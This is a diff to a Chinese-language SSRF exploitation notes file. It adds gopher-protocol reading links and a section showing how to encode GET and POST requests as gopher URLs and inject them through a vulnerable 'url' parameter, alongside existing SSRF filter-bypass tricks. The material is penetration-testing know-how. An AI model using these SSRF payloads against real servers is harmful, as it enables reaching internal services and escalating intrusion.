@@ -20,6 +20,8 @@
 - [SSRF 利用与防御](https://hellohxk.com/blog/ssrf/)
 - [聊一聊ssrf漏洞的挖掘思路与技巧](https://bbs.ichunqiu.com/thread-49370-1-1.html)
 - [Bypassing SSRF Protection](https://medium.com/@vickieli/bypassing-ssrf-protection-e111ae70727b)
+- [Gopher协议在SSRF漏洞中的深入研究](https://zhuanlan.zhihu.com/p/112055947)
+- [gopher 协议初探](https://www.cnblogs.com/Konmu/p/12984891.html)
 
 **相关案例**
 - [My First SSRF Using DNS Rebinding](https://geleta.eu/2019/my-first-ssrf-using-dns-rebinfing/)
@@ -37,9 +39,12 @@
 - [swisskyrepo/SSRFmap](https://github.com/swisskyrepo/SSRFmap) - 自动化 Fuzz SSRF 开发工具
 - [tarunkant/Gopherus](https://github.com/tarunkant/Gopherus) - 该工具生成 gopher payload ，以利用 SSRF 并在各种服务器中获得 RCE
 
+**相关资源**
+- [cujanovic/SSRF-Testing](https://github.com/cujanovic/SSRF-Testing)
+
 ---
 
-# 利用方式
+## 利用方式
 
 - 内部端口扫描
 - Leverage cloud services
@@ -51,7 +56,7 @@
 
 ---
 
-# 绕过方法
+## 绕过方法
 
 **特殊 IP**
 ```
@@ -123,3 +128,64 @@ otherapp.10.0.0.1.nip.io
 http://127.0.0.1 translates to http://2130706433
 localhost translates to %6c%6f%63%61%6c%68%6f%73%74
 ```
+
+---
+
+## Gopher
+
+gopher 协议支持发出 GET、POST 请求：可以先截获 get 请求包和 post 请求包，在构成符合 gopher 协议的请求。
+
+gopher 协议是 ssrf 利用中最强大的协议
+
+**格式**
+```
+gopher://<host>:<port>/<gopher-path>_后接TCP数据流
+
+curl gopher://127.0.0.1:8000/_GET%20test
+```
+
+gopher的默认端口是70
+
+如果发起 post 请求，回车换行需要使用 %0d%0a，如果多个参数，参数之间的 & 也需要进行 URL 编码
+
+**发送 get 请求**
+
+如果要发送如下 payload
+```
+GET /test/get.php?name=test HTTP/1.1
+Host: 192.168.1.1
+```
+
+那么需要变为如下格式
+```
+curl gopher://192.168.1.2:80/_GET%20/test/get.php%3fname=test%20HTTP/1.1%0d%0AHost:%20192.168.1.2%0d%0A
+```
+
+在 HTTP 包的最后要加 %0d%0a，代表消息结束
+
+**发送 post 请求**
+
+```
+POST /test/post.php HTTP/1.1
+Host: 192.168.1.1
+Content-Type:application/x-www-form-urlencoded
+Content-Length:11
+
+name=test
+```
+
+那么需要变为如下格式
+```
+curl gopher://192.168.1.1:80/_POST%20/test/post.php%20HTTP/1.1%0d%0AHost:192.168.1.1%0d%0AContent-Type:application/x-www-form-urlencoded%0d%0AContent-Length:11%0d%0A%0d%0Aname=test%0d%0A
+```
+
+**ssrf 中的利用**
+
+```
+http://192.168.1.1/test/ssrf.php?url=gopher://192.168.1.2:6666/_abc
+
+# 由于PHP在接收到参数后会做一次URL的解码,所以要在 url 编码一次
+http://192.168.1.1/test/ssrf.php?url=gopher%3A%2F%2F192.168.1.2%3A80%2F_GET%2520%2Ftest%2Fget.php%253fname%3Dtest%2520HTTP%2F1.1%250d%250AHost%3A%2520192.168.1.2%250d%250A
+```
+
+URL中的／不能进行两次编码，端口号不可以两次编码,协议名称不可两次转码
